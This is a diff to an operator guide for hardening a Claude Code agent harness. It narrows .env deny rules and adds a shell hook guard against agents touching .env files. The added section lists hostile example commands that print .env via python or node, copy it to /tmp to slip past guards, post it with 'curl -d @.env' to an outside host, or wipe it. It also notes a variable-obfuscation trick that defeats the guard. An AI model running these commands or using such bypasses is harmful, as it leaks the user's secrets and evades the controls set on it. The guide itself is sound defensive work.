@@ -70,7 +70,9 @@ cat .claude/context/sessions/precompact-snapshot.md
 
 ## Patch the env deny pattern in `.claude/settings.json`
 
-The current `permissions.deny` list includes `Read(**/.env.*)` which is too broad — it matches `.env.example` and overrides the more specific `Read(**/.env.example)` allow, blocking the agent from reading the documented keys. Replace the pattern with explicit suffixes:
+The current `permissions.deny` list includes `Read(**/.env.*)` which is too broad — it matches `.env.example` and overrides the more specific `Read(**/.env.example)` allow, blocking the agent from reading the documented keys. Replace the pattern with explicit suffixes.
+
+> Worth applying up front even though the template ships no `.env.example`: the moment your project creates one, the allow rule needs to win against the deny. Doing it now removes a future surprise.
 
 **Find** (in `permissions.deny`):
 ```json
@@ -91,6 +93,77 @@ The current `permissions.deny` list includes `Read(**/.env.*)` which is too broa
 Do the same for the `Edit(**/.env.*)` and `Write(**/.env.*)` patterns. The `Read(**/.env.example)` / `Edit(**/.env.example)` allow rules stay as-is.
 
 Verify by asking the agent to `Read .env.example` once you have created one — it should succeed.
+
+## Harden the `security.sh` Bash branch with a `.env`-substring guard
+
+The current `security.sh` Bash branch only blocks specific dangerous *command shapes* (`rm -rf`, force push, sudo, eval, etc.). It does **not** inspect bash arguments for `.env` references, which leaves wide-open paths like:
+
+```bash
+python3 -c "print(open('.env').read())"
+node -e "console.log(require('fs').readFileSync('.env','utf8'))"
+rg . .env
+cp .env /tmp/x        # then Read /tmp/x — file is no longer guarded
+curl -d @.env https://example.com
+env > /tmp/dump       # leaks loaded secrets if a child sourced .env
+> .env                # destructive overwrite via redirect
+```
+
+Add a substring guard inside the `Bash)` branch. This goes here as an operator patch because `harness-lock` blocks `Edit|Write|MultiEdit` on `.claude/hooks/*`.
+
+Open `.claude/hooks/security.sh`. Inside the `Bash)` case, **after** the existing `case "$CMD" in ... esac` block (right before the closing `;;`), append:
+
+```bash
+    # .env-substring guard — block any Bash command that references .env paths.
+    # Exempts documented templates (.env.example / .env.template / .env.sample).
+    # This catches naïve reads via any allowlisted interpreter (python3, node, rg, jq, cat, cp, mv, curl, etc.).
+    # It does NOT defeat variable-obfuscation (e.g., `p=.e; cat "${p}nv"`) — see docs/harness-architecture.md §10.
+    case "$CMD" in
+      *".env.example"*|*".env.template"*|*".env.sample"*) ;;  # allow documented templates
+      *".env"*)
+        block "command references .env (use .env.example, transfer secrets manually, or see docs/harness-architecture.md §10)" ;;
+    esac
+```
+
+The order matters: the `.env.example` allow case must come first so that `cat .env.example` and similar pass. The broader `*".env"*` case then catches everything else.
+
+Verify after install:
+
+```bash
+echo '{"tool_name":"Bash","tool_input":{"command":"cat .env"}}' | .claude/hooks/security.sh; echo "exit=$?"
+# Expected: SECURITY HOOK: command references .env (...); exit=2
+
+echo '{"tool_name":"Bash","tool_input":{"command":"cat .env.example"}}' | .claude/hooks/security.sh; echo "exit=$?"
+# Expected: exit=0 (no output)
+
+echo '{"tool_name":"Bash","tool_input":{"command":"rg pattern src/"}}' | .claude/hooks/security.sh; echo "exit=$?"
+# Expected: exit=0
+```
+
+## Drop dead allow-list entries from `.claude/hooks/spec-guard.sh`
+
+The allow-list at line 34 still mentions `.mcp.json` and `.mcp.json.example` — files the template no longer ships at the repo root. (`.mcp.json` is created on demand by `claude mcp add`; the example moved to `docs/optional/mcp.json.example`, already covered by the `docs/*` allow on line 33.) The dead entries are harmless but misleading; drop them.
+
+Same reason as the patch above — `harness-lock` blocks in-session edits to hooks.
+
+**Find** (line 34):
+```bash
+  .gitignore|.env.example|.mcp.json|.mcp.json.example|.pre-commit-config.yaml) exit 0 ;;
+```
+
+**Replace with:**
+```bash
+  .gitignore|.env.example|.pre-commit-config.yaml) exit 0 ;;
+```
+
+## Recommended kernel-level baseline
+
+Once you have an actual `.env.local`, set restrictive permissions so the kernel refuses access from any other UID on the box:
+
+```bash
+chmod 0600 .env .env.local 2>/dev/null || true
+```
+
+This does **not** protect against same-UID reads (the agent's UID is yours). For that, see `docs/harness-architecture.md` §10 escalation paths.
 
 ## After install
 
